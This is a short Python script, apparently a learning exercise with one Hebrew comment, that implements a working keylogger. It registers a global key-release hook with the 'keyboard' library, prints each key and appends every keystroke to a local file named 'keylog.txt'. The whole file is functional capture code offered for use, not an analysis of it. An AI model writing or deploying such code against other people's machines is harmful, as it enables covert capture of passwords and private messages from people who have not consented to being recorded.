import keyboard

class Keylogger():
    def __init__(self, FileName):
        self.file = open(FileName, "w")
    def callback(self, event):
        print(event.name)
        if event.name == "space":
            self.file.write(" ")
        else:
            self.file.write(event.name)
        self.file.flush()

    def start_log(self):
        keyboard.on_release(callback= self.callback) # שמקש נלחץ תקרא לפונקציה new key
        keyboard.wait()
        

Keylogger_object = Keylogger("keylog.txt")
Keylogger_object.start_log()